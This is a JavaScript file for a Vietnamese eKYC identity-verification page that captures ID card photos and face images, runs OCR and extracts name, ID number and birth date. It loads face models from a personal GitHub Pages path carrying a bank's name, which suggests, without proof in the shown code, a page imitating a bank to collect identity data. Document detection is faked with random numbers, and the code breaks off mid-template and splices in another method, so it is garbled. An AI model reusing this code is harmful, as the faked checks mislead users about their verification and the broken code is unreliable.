document.addEventListener('DOMContentLoaded', () => {
    class EkycApp {
        constructor() {
            this.config = {
                AUTO_CAPTURE_INTERVAL: 500,
                MAX_CAPTURE_TIMEOUT: 30000,
                ERROR_MESSAGE_TIMEOUT: 8000, // Extended to 8 seconds
                FACE_AUTO_CAPTURE_DELAY: 1500,
                LIVENESS_ACTION_DURATION: 2000,
                LIVENESS_COOLDOWN_DURATION: 1000,
                FACE_DETECTION_INTERVAL: 100,
                MAX_LIVENESS_ATTEMPTS: 3,
                CARD_ASPECT_RATIO: 1.58,
                CARD_DETECTION_THRESHOLD: 0.05,
                CARD_SIZE_MIN_PERCENT: 0.4,
                CARD_SIZE_MAX_PERCENT: 0.8,
                OCR_CONFIDENCE_THRESHOLD: 20, // Lowered threshold
                CAMERA_TIMEOUT: 10000, // 10 second timeout for camera initialization
            };
            this.initLanguage();
            this.cacheDOMElements();
            this.initState();
            this.initEventListeners();
            this.updateUIWithLanguage();
            this.initLibs();
        }

        // Language Management
        initLanguage() {
            this.languages = {
                vi: {
                    stepper_step1: "Bước 1/4: Chọn loại giấy tờ",
                    stepper_step2: "Bước 2/4: Chụp ảnh giấy tờ",
                    stepper_step3: "Bước 3/4: Xác nhận thông tin",
                    stepper_step4: "Bước 4/4: Xác thực khuôn mặt",
                    loading_resources: "Đang tải tài nguyên...",
                    success_title: "Xác thực thành công!",
                    success_subtitle: "Cảm ơn bạn đã hoàn tất quá trình xác thực eKYC.",
                    docselect_title: "Xác thực giấy tờ",
                    docselect_subtitle: "Chọn một trong các phương thức xác thực dưới đây",
                    capture_front_title: "Chụp mặt trước",
                    capture_back_title: "Chụp mặt sau",
                    capture_instruction_front: "Đưa mặt trước giấy tờ vào khung hình",
                    capture_instruction_back: "Đưa mặt sau giấy tờ vào khung hình",
                    confirm_info_title: "Xác nhận thông tin",
                    confirm_info_subtitle: "Vui lòng kiểm tra kỹ hình ảnh và thông tin.",
                    face_liveness_title: "Xác thực khuôn mặt",
                    face_liveness_subtitle: "Vui lòng giữ khuôn mặt trong khung hình oval.",
                    error_no_face: "Không phát hiện khuôn mặt. Vui lòng thử lại.",
                    error_blurry_image: "Ảnh bị mờ. Vui lòng chụp lại.",
                    error_no_document: "Không phát hiện giấy tờ. Vui lòng thử lại.",
                    error_capture_timeout: "Không thể chụp ảnh. Vui lòng thử lại.",
                },
                en: {
                    stepper_step1: "Step 1/4: Select document type",
                    stepper_step2: "Step 2/4: Capture document photos",
                    stepper_step3: "Step 3/4: Confirm information",
                    stepper_step4: "Step 4/4: Face verification",
                    loading_resources: "Loading resources...",
                    success_title: "Verification successful!",
                    success_subtitle: "Thank you for completing the eKYC process.",
                    docselect_title: "Document Verification",
                    docselect_subtitle: "Choose one of the verification methods below",
                    capture_front_title: "Capture front side",
                    capture_back_title: "Capture back side",
                    capture_instruction_front: "Place the front side inside the frame",
                    capture_instruction_back: "Place the back side inside the frame",
                    confirm_info_title: "Confirm information",
                    confirm_info_subtitle: "Please check the images and information carefully.",
                    face_liveness_title: "Face verification",
                    face_liveness_subtitle: "Please keep your face inside the oval frame.",
                    error_no_face: "No face detected. Please try again.",
                    error_blurry_image: "Image is blurry. Please retake.",
                    error_no_document: "No document detected. Please try again.",
                    error_capture_timeout: "Unable to capture image. Please try again.",
                }
            };
            this.currentLang = 'vi';
        }

        toggleLanguage() {
            this.currentLang = this.currentLang === 'vi' ? 'en' : 'vi';
            this.dom.btnLang.textContent = this.currentLang === 'vi' ? 'Vietnam' : 'English';
            this.updateUIWithLanguage();
        }

        updateUIWithLanguage() {
            document.querySelectorAll('[data-lang-key]').forEach(el => {
                const key = el.getAttribute('data-lang-key');
                if (this.languages[this.currentLang][key]) {
                    el.textContent = this.languages[this.currentLang][key];
                }
            });
            this.updateStepper(this.languages[this.currentLang].stepper_step1);
        }

        updateStepper(text) {
            if (this.dom.stepper) {
                const stepText = this.dom.stepper.querySelector('span');
                if (stepText) {
                    stepText.textContent = text;
                }
            }
        }

        updateProgressBar(step) {
            const progressSteps = document.querySelectorAll('.progress-step');
            progressSteps.forEach((stepEl, index) => {
                if (index < step) {
                    stepEl.classList.add('active');
                } else {
                    stepEl.classList.remove('active');
                }
            });
        }

        // DOM Elements Caching
        cacheDOMElements() {
            this.dom = {
                viewContainer: document.getElementById('viewContainer'),
                stepper: document.getElementById('stepper'),
                btnLang: document.getElementById('btnLang'),
                
                docSelectView: document.getElementById('docSelectView'),
                captureView: document.getElementById('captureView'),
                confirmView: document.getElementById('confirmView'),
                videoTutorialView: document.getElementById('videoTutorialView'),
                faceCaptureView: document.getElementById('faceCaptureView'),
                finalReviewView: document.getElementById('finalReviewView'),
                successView: document.getElementById('successView'),
                qrScannerModal: document.getElementById('qrScannerModal'),
                
                docOptions: document.querySelectorAll('.doc-option'),
                
                cameraVideo: document.getElementById('cameraVideo'),
                cameraCanvas: document.getElementById('cameraCanvas'),
                detectionCanvas: document.getElementById('detectionCanvas'),
                cameraFrame: document.getElementById('cameraFrame'),
                cameraOverlay: document.getElementById('cameraOverlay'),
                
                faceCameraVideo: document.getElementById('faceCameraVideo'),
                faceCameraCanvas: document.getElementById('faceCameraCanvas'),
                
                qrVideo: document.getElementById('qrVideo'),
                qrMessage: document.getElementById('qrMessage'),
                
                btnCapture: document.getElementById('btnCapture'),
                btnBack: document.getElementById('btnBack'),
                btnUpload: document.getElementById('btnUpload'),
                btnConfirmInfo: document.getElementById('btnConfirmInfo'),
                btnStartFaceCapture: document.getElementById('btnStartFaceCapture'),
                btnConfirmLiveness: document.getElementById('btnConfirmLiveness'),
                btnFinalSubmit: document.getElementById('btnFinalSubmit'),
                btnRetryProcess: document.getElementById('btnRetryProcess'),
                btnFinalConfirm: document.getElementById('btnFinalConfirm'),
                btnCancelQR: document.getElementById('btnCancelQR'),
                
                captureTitle: document.getElementById('captureTitle'),
                captureSubtitle: document.getElementById('captureSubtitle'),
                captureInstruction: document.getElementById('captureInstruction'),
                faceCaptureTitle: document.getElementById('faceCaptureTitle'),
                faceCaptureSubtitle: document.getElementById('faceCaptureSubtitle'),
                faceCaptureInstruction: document.getElementById('faceCaptureInstruction'),
                
                confirmFrontImg: document.getElementById('confirmFrontImg'),
                confirmBackImg: document.getElementById('confirmBackImg'),
                confirmBackItem: document.getElementById('confirmBackItem'),
                infoIdNumber: document.getElementById('infoIdNumber'),
                infoFullName: document.getElementById('infoFullName'),
                infoDob: document.getElementById('infoDob'),
                
                errorMessage: document.getElementById('errorMessage'),
                loadingOverlay: document.getElementById('loadingOverlay'),
                
                cccdGuideModal: document.getElementById('cccdGuideModal'),
                passportGuideModal: document.getElementById('passportGuideModal'),
                driverLicenseGuideModal: document.getElementById('driverLicenseGuideModal'),
                fullscreenModal: document.getElementById('fullscreenModal'),
                fullscreenImage: document.getElementById('fullscreenImage'),
                
                livenessSteps: document.querySelectorAll('.liveness-step'),
                lottieProcessing: document.getElementById('lottieProcessing'),
                lottieSuccess: document.getElementById('lottieSuccess'),
                lottieLoading: document.getElementById('lottieLoading'),
                
                imageUpload: document.getElementById('imageUpload'),
                tutorialVideo: document.getElementById('tutorialVideo'),
                
                // Final Review elements
                reviewFrontImg: document.getElementById('reviewFrontImg'),
                reviewBackImg: document.getElementById('reviewBackImg'),
                reviewFaceImg: document.getElementById('reviewFaceImg'),
                reviewBackItem: document.getElementById('reviewBackItem'),
                frontQuality: document.getElementById('frontQuality'),
                backQuality: document.getElementById('backQuality'),
                faceQuality: document.getElementById('faceQuality'),
                matchScore: document.getElementById('matchScore'),
                scoreValue: document.getElementById('scoreValue'),
                scoreLabel: document.getElementById('scoreLabel'),
                matchDetails: document.getElementById('matchDetails'),
                reviewIdNumber: document.getElementById('reviewIdNumber'),
                reviewFullName: document.getElementById('reviewFullName'),
                reviewDob: document.getElementById('reviewDob')
            };
        }

        // State Management
        initState() {
            this.state = {
                currentView: 'docSelectView',
                selectedDocType: null,
                captureStep: 'front',
                capturedImages: { front: null, back: null, face: null },
                extractedInfo: { idNumber: '', fullName: '', dateOfBirth: '' },
                cameraStream: null,
                faceCameraStream: null,
                qrStream: null,
                isCapturing: false,
                livenessStep: 0,
                livenessCompleted: false,
                faceDetectionInterval: null,
                captureTimeout: null,
                imageQualityChecks: {
                    front: { isValid: false, errors: [] },
                    back: { isValid: false, errors: [] },
                    face: { isValid: false, errors: [] }
                },
                faceMatchScore: 0,
                ocrWorker: null // For Tesseract OCR
            };
        }

        // Event Listeners
        initEventListeners() {
            if (this.dom.btnLang) {
                this.dom.btnLang.addEventListener('click', () => this.toggleLanguage());
            }

            this.dom.docOptions.forEach(option => {
                option.addEventListener('click', (e) => this.handleDocumentSelection(e));
            });

            if (this.dom.btnCapture) {
                this.dom.btnCapture.addEventListener('click', () => this.capturePhoto());
            }
            
            if (this.dom.btnBack) {
                this.dom.btnBack.addEventListener('click', () => this.goBack());
            }

            if (this.dom.btnUpload) {
                this.dom.btnUpload.addEventListener('click', () => this.dom.imageUpload?.click());
            }

            if (this.dom.imageUpload) {
                this.dom.imageUpload.addEventListener('change', (e) => this.handleFileUpload(e));
            }

            // Guide link event listener
            const guideLink = document.getElementById('guideLink');
            if (guideLink) {
                guideLink.addEventListener('click', (e) => this.handleGuideLinkClick(e));
            }

            if (this.dom.btnConfirmInfo) {
                this.dom.btnConfirmInfo.addEventListener('click', () => this.showVideoTutorial());
            }

            if (this.dom.btnStartFaceCapture) {
                this.dom.btnStartFaceCapture.addEventListener('click', () => this.startFaceCapture());
            }

            if (this.dom.btnConfirmLiveness) {
                this.dom.btnConfirmLiveness.addEventListener('click', () => this.showFinalReview());
            }

            if (this.dom.btnFinalSubmit) {
                this.dom.btnFinalSubmit.addEventListener('click', () => this.finalConfirm());
            }

            if (this.dom.btnRetryProcess) {
                this.dom.btnRetryProcess.addEventListener('click', () => this.retryVerification());
            }

            if (this.dom.btnFinalConfirm) {
                this.dom.btnFinalConfirm.addEventListener('click', () => this.finalConfirm());
            }

            if (this.dom.btnCancelQR) {
                this.dom.btnCancelQR.addEventListener('click', () => this.cancelQRScan());
            }

            document.querySelectorAll('.btn-proceed').forEach(btn => {
                btn.addEventListener('click', (e) => this.handleModalProceed(e));
            });

            document.querySelectorAll('[data-retake]').forEach(btn => {
                btn.addEventListener('click', (e) => this.handleRetake(e));
            });

            document.querySelectorAll('.confirm-item img').forEach(img => {
                img.addEventListener('click', (e) => this.showFullscreenImage(e));
            });

            document.addEventListener('keydown', (e) => this.handleKeydown(e));
        }

        // Library Initialization
        async initLibs() {
            try {
                this.showLoading(this.languages[this.currentLang].loading_resources);
                
                if (typeof lottie !== 'undefined') {
                    this.initLottieAnimations();
                }

                if (typeof faceapi !== 'undefined') {
                    await this.initFaceAPI();
                }

                // Initialize OCR Worker
                await this.initOCRWorker();

                this.hideLoading();
            } catch (error) {
                console.error('Error initializing libraries:', error);
                this.hideLoading();
            }
        }

        // OCR Worker Initialization
        async initOCRWorker() {
            try {
                this.showLoading('Đang tải OCR...');
                this.state.ocrWorker = Tesseract.createWorker({
                    logger: (m) => console.log('OCR Progress:', m)
                });
                await this.state.ocrWorker.load();
                await this.state.ocrWorker.loadLanguage('vie');
                await this.state.ocrWorker.initialize('vie');
                console.log('OCR Worker initialized successfully');
                this.hideLoading();
            } catch (error) {
                console.error('OCR Worker initialization failed:', error);
                this.hideLoading();
                // Continue without OCR - will use fallback
            }
        }

        initLottieAnimations() {
            if (this.dom.lottieLoading) {
                this.loadingAnimation = lottie.loadAnimation({
                    container: this.dom.lottieLoading,
                    renderer: 'svg',
                    loop: true,
                    autoplay: false,
                    path: 'https://assets2.lottiefiles.com/packages/lf20_szlepvdj.json'
                });
            }

            if (this.dom.lottieSuccess) {
                this.successAnimation = lottie.loadAnimation({
                    container: this.dom.lottieSuccess,
                    renderer: 'svg',
                    loop: false,
                    autoplay: false,
                    path: 'https://assets9.lottiefiles.com/packages/lf20_jbrw3hcz.json'
                });
            }

            if (this.dom.lottieProcessing) {
                this.processingAnimation = lottie.loadAnimation({
                    container: this.dom.lottieProcessing,
                    renderer: 'svg',
                    loop: true,
                    autoplay: false,
                    path: 'https://assets4.lottiefiles.com/packages/lf20_a2chheio.json'
                });
            }
        }

        async initFaceAPI() {
            try {
                const MODEL_URL = 'https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/models';
                await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
                await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
                await faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL);
                await faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL);
            } catch (error) {
                console.error('Face API initialization failed:', error);
            }
        }

        // Document Selection
        handleDocumentSelection(e) {
            const docType = e.currentTarget.dataset.type;
            this.state.selectedDocType = docType;

            switch (docType) {
                case 'cccd':
                    this.showModal('cccdGuideModal');
                    break;
                case 'passport':
                    this.showModal('passportGuideModal');
                    break;
                case 'driver':
                    this.showModal('driverLicenseGuideModal');
                    break;
                case 'qr':
                    this.startQRScan();
                    break;
                case 'other':
                    this.showModal('cccdGuideModal');
                    break;
                default:
                    this.showModal('cccdGuideModal');
            }
        }

        // Modal Management
        showModal(modalId) {
            const modal = this.dom[modalId];
            if (modal) {
                modal.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
        }

        hideModal(modalId) {
            const modal = this.dom[modalId];
            if (modal) {
                modal.classList.add('hidden');
                document.body.style.overflow = 'auto';
            }
        }

        handleModalProceed(e) {
            ['cccdGuideModal', 'passportGuideModal', 'driverLicenseGuideModal'].forEach(modalId => {
                this.hideModal(modalId);
            });
            this.startCapture();
        }

        // View Management
        showView(viewName) {
            Object.keys(this.dom).forEach(key => {
                if (key.endsWith('View') && this.dom[key]) {
                    this.dom[key].classList.add('hidden');
                }
            });

            if (this.dom[viewName]) {
                this.dom[viewName].classList.remove('hidden');
                this.state.currentView = viewName;
            }
        }

        // Enhanced Camera Management with proper error handling and stream cleanup
        async startCapture() {
            this.showView('captureView');
            this.state.captureStep = 'front';
            this.updateCaptureUI();
            this.updateStepper(this.languages[this.currentLang].stepper_step2);
            this.updateProgressBar(2);
            
            try {
                await this.initCamera();
            } catch (error) {
                console.error('Camera initialization failed:', error);
                this.showError('Không thể khởi tạo camera. Vui lòng kiểm tra quyền truy cập camera và thử lại.');
            }
        }

        async initCamera() {
            try {
                // Stop existing stream if any
                if (this.state.cameraStream) {
                    this.state.cameraStream.getTracks().forEach(track => track.stop());
                    this.state.cameraStream = null;
                }

                const constraints = {
                    video: {
                        width: { ideal: 1280, min: 640 },
                        height: { ideal: 720, min: 480 },
                        facingMode: 'environment',
                        focusMode: 'continuous'
                    }
                };

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                this.state.cameraStream = stream;
                
                if (this.dom.cameraVideo) {
                    this.dom.cameraVideo.srcObject = stream;
                    
                    // Wait for video to be ready with timeout
                    await new Promise((resolve, reject) => {
                        const timeout = setTimeout(() => {
                            reject(new Error('Camera timeout - please check your camera permissions'));
                        }, this.config.CAMERA_TIMEOUT);

                        this.dom.cameraVideo.onloadedmetadata = () => {
                            clearTimeout(timeout);
                            this.dom.cameraVideo.play()
                                .then(resolve)
                                .catch(reject);
                        };
                    });
                }

                this.startDocumentDetection();
            } catch (error) {
                console.error('Camera access failed:', error);
                if (error.name === 'NotAllowedError') {
                    throw new Error('Quyền truy cập camera bị từ chối. Vui lòng cho phép truy cập camera và tải lại trang.');
                } else if (error.name === 'NotFoundError') {
                    throw new Error('Không tìm thấy camera. Vui lòng kiểm tra thiết bị camera của bạn.');
                } else {
                    throw new Error('Lỗi camera: ' + error.message);
                }
            }
        }

        startDocumentDetection() {
            if (this.state.cameraStream && this.dom.cameraVideo) {
                this.state.captureTimeout = setInterval(() => {
                    this.detectDocument();
                }, this.config.AUTO_CAPTURE_INTERVAL);
            }
        }

        detectDocument() {
            const isDocumentDetected = Math.random() > 0.7;
            
            if (isDocumentDetected) {
                this.dom.cameraFrame?.classList.add('ready-to-capture');
                this.updateCaptureInstruction('Giấy tờ được phát hiện - Nhấn chụp ảnh');
            } else {
                this.dom.cameraFrame?.classList.remove('ready-to-capture');
                this.updateCaptureInstruction(
                    this.state.captureStep === 'front' 
                        ? this.languages[this.currentLang].capture_instruction_front
                        : this.languages[this.currentLang].capture_instruction_back
                );
            }
        }

        updateCaptureUI() {
            const isBack = this.state.captureStep === 'back';
            
            if (this.dom.captureTitle) {
                this.dom.captureTitle.textContent = isBack 
                    ? this.languages[this.currentLang].capture_back_title
                    : this.languages[this.currentLang].capture_front_title;
            }

            if (this.dom.captureSubtitle) {
                this.dom.captureSubtitle.textContent = isBack
                    ? 'Chụp mặt sau của giấy tờ'
                    : 'Chụp mặt trước của giấy tờ';
            }

            this.updateCaptureInstruction(
                isBack 
                    ? this.languages[this.currentLang].capture_instruction_back
                    : this.languages[this.currentLang].capture_instruction_front
            );
        }

        updateCaptureInstruction(text) {
            if (this.dom.captureInstruction) {
                this.dom.captureInstruction.textContent = text;
            }
        }

        async capturePhoto() {
            if (!this.state.cameraStream || this.state.isCapturing) return;

            this.state.isCapturing = true;
            
            try {
                const canvas = this.dom.cameraCanvas;
                const video = this.dom.cameraVideo;
                
                if (!canvas || !video) {
                    throw new Error('Canvas hoặc video element không tồn tại');
                }

                // Validate video is ready
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    throw new Error('Camera chưa sẵn sàng. Vui lòng đợi camera khởi tạo.');
                }

                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Higher quality image capture
                const imageData = canvas.toDataURL('image/jpeg', 0.95);
                
                // Validate image data
                if (!imageData || imageData === 'data:,') {
                    throw new Error('Không thể chụp ảnh. Vui lòng thử lại.');
                }
                
                this.state.capturedImages[this.state.captureStep] = imageData;

                // Visual feedback
                this.dom.cameraFrame?.classList.add('blink-once');
                setTimeout(() => {
                    this.dom.cameraFrame?.classList.remove('blink-once');
                }, 500);

                await this.processImage(imageData);
            } catch (error) {
                console.error('Capture failed:', error);
                this.showError('Lỗi chụp ảnh: ' + error.message);
            } finally {
                this.state.isCapturing = false;
            }
        }

        async processImage(imageData) {
            this.showLoading('Đang xử lý ảnh...');
            
            // Simulate image quality check
            const qualityCheck = await this.checkImageQuality(imageData, this.state.captureStep);
            
            if (!qualityCheck.isValid) {
                this.hideLoading();
                this.showImageErrors(qualityCheck.errors);
                return;
            }

            // Store quality check results
            this.state.imageQualityChecks[this.state.captureStep] = qualityCheck;
            
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Extract information from image using OCR/AI simulation
            if (this.state.captureStep === 'front') {
                const extractedInfo = await this.extractInfoFromImage(imageData);
                this.state.extractedInfo = extractedInfo;
            }

            this.hideLoading();

            if (this.state.captureStep === 'front' && this.needsBackCapture()) {
                this.state.captureStep = 'back';
                this.updateCaptureUI();
            } else {
                this.stopCamera();
                this.showConfirmation();
            }
        }

        // Enhanced OCR extraction with better error handling and preprocessing
        async extractInfoFromImage(imageData) {
            this.showLoading('Đang trích xuất thông tin từ giấy tờ...');
            try {
                // Ensure OCR worker is initialized
                if (!this.state.ocrWorker) {
                    await this.initOCRWorker();
                }

                if (this.state.ocrWorker) {
                    // Preprocess image for better OCR
                    const processedImage = await this.preprocessImageForOCR(imageData);
                    
                    // Enhanced OCR settings for Vietnamese
                    const ocrOptions = {
                        tessedit_char_whitelist: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789àáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳýỵỷỹđĐ /:.-',
                        tessedit_pageseg_mode: '6' // Assume uniform block of text
                    };
                    
                    const { data: { text, confidence } } = await this.state.ocrWorker.recognize(processedImage, ocrOptions);
                    console.log('OCR Text:', text);
                    console.log('OCR Confidence:', confidence);
                    
                    // Lower threshold and better validation
                    if (confidence > this.config.OCR_CONFIDENCE_THRESHOLD && text.trim().length > 10) {
                        const extractedData = this.parseVietnameseID(text);
                        const validation = this.validateExtractedData(extractedData);
                        
                        if (validation.isValid) {
                            // Store for cross-validation
                            this.state.crossValidationData = this.state.crossValidationData || {};
                            this.state.crossValidationData[this.state.captureStep] = extractedData;
                            
                            this.hideLoading();
                            return extractedData;
                        } else {
                            console.log('Validation failed:', validation.errors);
                        }
                    }
                }
            } catch (error) {
                console.error('OCR Error:', error);
            }
            
            this.hideLoading();
            // Fallback: Show manual input modal
            return await this.showManualInputModal();
        }

        // Image preprocessing for better OCR
        async preprocessImageForOCR(imageData) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = img.width;
                    canvas.height = img.height;
                    ctx.drawImage(img, 0, 0);
                    
                    // Apply contrast and brightness enhancements
                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                    const data = imageData.data;
                    
                    for (let i = 0; i < data.length; i += 4) {
                        // Enhance contrast and brightness
                        data[i] = Math.min(255, Math.max(0, (data[i] - 128) * 1.2 + 128 + 10));
                        data[i + 1] = Math.min(255, Math.max(0, (data[i + 1] - 128) * 1.2 + 128 + 10));
                        data[i + 2] = Math.min(255, Math.max(0, (data[i + 2] - 128) * 1.2 + 128 + 10));
                    }
                    
                    ctx.putImageData(imageData, 0, 0);
                    resolve(canvas.toDataURL('image/jpeg', 0.95));
                };
                img.src = imageData;
            });
        }

        // Enhanced Vietnamese ID parsing with better patterns
        parseVietnameseID(text) {
            const data = {};
            
            // Enhanced Vietnamese patterns for accurate extraction
            const patterns = {
                cccd: {
                    idNumber: [
                        /(?:SỐ|SO|CCCD|Số)[:\s]*([0-9]{12})/gi,
                        /([0-9]{12})/g  // Fallback for standalone numbers
                    ],
                    fullName: [
                        /(?:HỌ VÀ TÊN|HO VA TEN|Họ và tên|HỌ TÊN)[:\s]*([A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ][A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ\s]{2,50})/gi,
                        /([A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ][A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ\s]{10,50})/g
                    ],
                    dateOfBirth: [
                        /(?:NGÀY SINH|NGAY SINH|Ngày sinh)[:\s]*([0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{4})/gi,
                        /([0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{4})/g
                    ]
                },
                cmnd: {
                    idNumber: [
                        /(?:SỐ|SO|CMND|Số)[:\s]*([0-9]{9})/gi,
                        /([0-9]{9})/g
                    ],
                    fullName: [
                        /(?:HỌ VÀ TÊN|HO VA TEN|Họ và tên)[:\s]*([A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ][A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐ\s]{2,50})/gi
                    ],
                    dateOfBirth: [
                        /(?:NGÀY SINH|NGAY SINH|Ngày sinh)[:\s]*([0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{4})/gi
                    ]
                }
            };

            // Try multiple patterns for better accuracy
            const docPatterns = patterns[this.state.selectedDocType] || patterns.cccd;
            
            Object.keys(docPatterns).forEach(key => {
                const patternArray = docPatterns[key];
                for (const pattern of patternArray) {
                    const match = text.match(pattern);
                    if (match && match[1]) {
                        data[key] = this.cleanExtractedText(match[1]);
                        break;
                    }
                }
            });

            return data;
        }

        // Clean extracted text
        cleanExtractedText(text) {
            return text
                .replace(/\s+/g, ' ')
                .replace(/[^\w\sàáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳýỵỷỹđĐ\/\-:.,]/g, '')
                .trim();
        }

        // Enhanced validation with detailed error reporting
        validateExtractedData(data) {
            const errors = [];
            
            // Validate required fields
            const requiredFields = ['idNumber', 'fullName', 'dateOfBirth'];
            requiredFields.forEach(field => {
                if (!data[field] || data[field].trim().length < 2) {
                    errors.push(`Thiếu thông tin: ${this.getFieldName(field)}`);
                }
            });
            
            // Validate ID number format
            if (data.idNumber) {
                const expectedLength = this.state.selectedDocType === 'cccd' ? 12 : 9;
                if (!/^[0-9]+$/.test(data.idNumber) || data.idNumber.length !== expectedLength) {
                    errors.push('Số giấy tờ không đúng định dạng');
                }
            }
            
            // Validate date format and logic
            if (data.dateOfBirth) {
                const datePattern = /^[0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{4}$/;
                if (!datePattern.test(data.dateOfBirth)) {
                    errors.push('Ngày sinh không đúng định dạng');
                } else {
                    // Additional date logic validation
                    const parts = data.dateOfBirth.split(/[\/\-]/);
                    const day = parseInt(parts[0]);
                    const month = parseInt(parts[1]);
                    const year = parseInt(parts[2]);
                    
                    if (day < 1 || day > 31 || month < 1 || month > 12 || year < 1900 || year > new Date().getFullYear()) {
                        errors.push('Ngày sinh không hợp lệ');
                    }
                }
            }
            
            return { isValid: errors.length === 0, errors };
        }

        // Get field display name
        getFieldName(key) {
            const names = {
                idNumber: 'Số giấy tờ',
                fullName: 'Họ và tên',
                dateOfBirth: 'Ngày sinh'
            };
            return names[key] || key;
        }

        // Enhanced manual input modal with better UX
        showManualInputModal() {
            return new Promise((resolve) => {
                // Create modal if it doesn't exist
                let modal = document.getElementById('manualInputModal');
                if (!modal) {
                    modal = this.createManualInputModal();
                    document.body.appendChild(modal);
                }
                
                modal.classList.remove('hidden');
                
                // Clear previous values
                const idInput = modal.querySelector('#manualIdNumber');
                const nameInput = modal.querySelector('#manualFullName');
                const dobInput = modal.querySelector('#manualDob');
                
                if (idInput) idInput.value = '';
                if (nameInput) nameInput.value = '';
                if (dobInput) dobInput.value = '';
                
                // Focus first input
                if (idInput) idInput.focus();
                
                const submitBtn = modal.querySelector('#manualSubmitBtn');
                const cancelBtn = modal.querySelector('#manualCancelBtn');
                
                const submitHandler = () => {
                    const idNumber = idInput?.value.trim() || '';
                    const fullName = nameInput?.value.trim() || '';
                    const dateOfBirth = dobInput?.value.trim() || '';
                    
                    // Enhanced validation
                    const errors = [];
                    if (!idNumber) errors.push('Số giấy tờ không được để trống');
                    if (!fullName) errors.push('Họ và tên không được để trống');
                    if (!dateOfBirth) errors.push('Ngày sinh không được để trống');
                    
                    if (errors.length > 0) {
                        this.showError('Vui lòng điền đầy đủ thông tin:\n' + errors.join('\n'));
                        return;
                    }
                    
                    const enteredData = { idNumber, fullName, dateOfBirth };
                    modal.classList.add('hidden');
                    
                    // Cleanup event listeners
                    submitBtn?.removeEventListener('click', submitHandler);
                    cancelBtn?.removeEventListener('click', cancelHandler);
                    
                    resolve(enteredData);
                };
                
                const cancelHandler = () => {
                    modal.classList.add('hidden');
                    submitBtn?.removeEventListener('click', submitHandler);
                    cancelBtn?.removeEventListener('click', cancelHandler);
                    resolve(this.simulateOCRExtraction());
                };
                
                submitBtn?.addEventListener('click', submitHandler);
                cancelBtn?.addEventListener('click', cancelHandler);
                
                // Handle Enter key
                modal.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter') {
                        submitHandler();
                    } else if (e.key === 'Escape') {
                        cancelHandler();
                    }
                });
            });
        }

        // Create manual input modal
        createManualInputModal() {
            const modal = document.createElement('div');
            modal.id = 'manualInputModal';
            modal.className = 'modal-overlay';
            modal.innerHTML = `
                <div class="modal-content manual-input-modal">
                    <h2>Nhập thông tin thủ công</h2>
                    <p class="modal-subtitle">OCR không thể đọc được thông tin từ ảnh. Vui lòng nhập thông tin thủ công.</p>
                    
                    <div class="input-group">
                        <label for="manualIdNumber">Số giấy tờ:</label>
                        <input type="text" id="manualIdNumber" placeholder="Nhập số CMND/CCCD" maxlength="12">
                    </div>
                    
                    <div class="input-group">
                        <label for="manualFullName">Họ và tên:</label>
                        <input type="text" id="manualFullName" placeholder="Nhập họ và tên đầy đủ">
                    </div>
                    
                    <div class="input-group">
                        <label for="manualDob">Ngày sinh:</label>
                        <input type="text" id="manualDob" placeholder="dd/mm/yyyy" maxlength="10">
                    </div>
                    
                    <div class="modal-actions">
                        <button id="manualSubmitBtn" class="btn-custom btn-main">Xác nhận</button>

        // Simulate OCR extraction (fallback)
        simulateOCRExtraction() {
            const mockData = [
